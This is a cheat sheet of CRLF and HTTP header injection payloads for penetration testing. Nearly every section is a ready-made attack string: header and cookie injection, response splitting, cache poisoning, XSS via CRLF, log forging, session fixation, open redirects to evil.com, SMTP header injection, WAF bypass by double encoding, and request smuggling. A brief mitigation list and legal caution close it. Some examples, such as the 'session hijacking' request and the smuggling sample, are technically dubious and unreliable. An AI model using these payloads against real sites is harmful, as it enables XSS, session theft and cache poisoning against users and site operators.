# **CRLF Injection (HTTP Header Injection) Payload Cheat Sheet**

CRLF (Carriage Return `\r` + Line Feed `\n`) injection allows attackers to manipulate HTTP headers and responses by injecting malicious newline characters. Below are various payloads for testing and exploiting CRLF vulnerabilities.

---

## **1. Basic CRLF Injection Payloads**
### **URL-Based Injection**
```
/?param=test%0d%0aX-Injected-Header: hacked
/?q=test%0d%0aSet-Cookie: malicious=payload
/?redirect=http://evil.com%0d%0aX-Forwarded-Host: evil.com
```

### **HTTP Header Injection**
```
GET / HTTP/1.1
Host: example.com
User-Agent: Mozilla%0d%0aX-Malicious-Header: attack
Referer: http://example.com%0d%0aX-Forwarded-For: 127.0.0.1
```

---

## **2. HTTP Response Splitting (HRS)**
### **Splitting Headers**
```
/?param=test%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>Hacked</h1>
```

### **Cache Poisoning**
```
/?q=test%0d%0aX-Cache: HIT%0d%0aX-Forwarded-Host: evil.com
```

---

## **3. Log Poisoning (XSS via CRLF)**
### **Injecting JavaScript into Logs**
```
/?user=test%0d%0a<script>alert(1)</script>
/?param=test%0d%0aX-XSS-Protection: 0%0d%0a%0d%0a<script>alert(1)</script>
```

### **Log Forging**
```
/?action=login%0d%0a[SUCCESS] Admin logged in from 127.0.0.1
```

---

## **4. Cookie Injection & Session Fixation**
### **Setting Malicious Cookies**
```
/?sessionid=123%0d%0aSet-Cookie: admin=true
/?redirect=home%0d%0aSet-Cookie: PHPSESSID=malicious
```

### **Session Hijacking**
```
GET /profile HTTP/1.1
Host: example.com
Cookie: sessionid=legit%0d%0aSet-Cookie: sessionid=evil
```

---

## **5. Open Redirect + CRLF**
### **Redirect to Malicious Site**
```
/?url=http://example.com%0d%0aLocation: http://evil.com
/?next=/dashboard%0d%0aX-Forwarded-Host: evil.com
```

### **Bypassing URL Filters**
```
/?redirect=javascript://example.com%0d%0a%0d%0aalert(1)
```

---

## **6. SMTP Header Injection (Email CRLF)**
### **Email Header Injection**
```
From: attacker@evil.com%0d%0aCC: victim@example.com%0d%0aSubject: Malicious
```

### **Email Body Injection**
```
Message: Hello%0d%0a%0d%0a<script>alert(1)</script>
```

---

## **7. Bypassing WAFs & Filters**
### **Double Encoding**
```
/?q=test%250d%250aX-Injected: hacked
```

### **Using Different Line Endings**
```
/?param=test%0aX-Forwarded-For: 127.0.0.1 (Unix-style)
/?param=test%0dX-Forwarded-For: 127.0.0.1 (Old Mac-style)
```

---

## **8. Exploiting HTTP Request Smuggling (CRLF in Chunked Encoding)**
### **HTTP Request Smuggling**
```
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: example.com
```

---

## **9. Exploiting HTTP/2 (H2.CRLF)**
### **HTTP/2 CRLF Injection**
```
:method GET
:path /
:authority example.com
x-injected-header: test\r\nX-Malicious: payload
```

---

## **10. Real-World Exploit Examples**
### **XSS via CRLF in Location Header**
```
/login?next=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
```

### **Cache Deception**
```
/?q=test%0d%0aX-Cache: MISS%0d%0aX-Forwarded-Host: attacker.com
```

---

## **Testing Methodology**
1. **Identify Input Points** (URL params, headers, forms, cookies).
2. **Test for CRLF (`%0d%0a`)** in user-controlled fields.
3. **Check for Response Splitting** (multiple headers in response).
4. **Verify Impact** (XSS, cache poisoning, open redirects).
5. **Bypass Filters** (double encoding, alternative line endings).

---

## **Mitigation**
- **Filter `\r\n` in user input**.
- **Use URL encoding** for dynamic headers.
- **Implement strict HTTP parsing**.
- **Disable header rewriting** where possible.

---

### **⚠️ Legal & Ethical Considerations**
- **Only test on authorized systems**.
- **CRLF can lead to severe vulnerabilities (XSS, cache poisoning, session hijacking)**.
- **Disclose responsibly** if found in production.

---

This cheat sheet covers various CRLF injection techniques for penetration testing and bug bounty hunting. Use responsibly!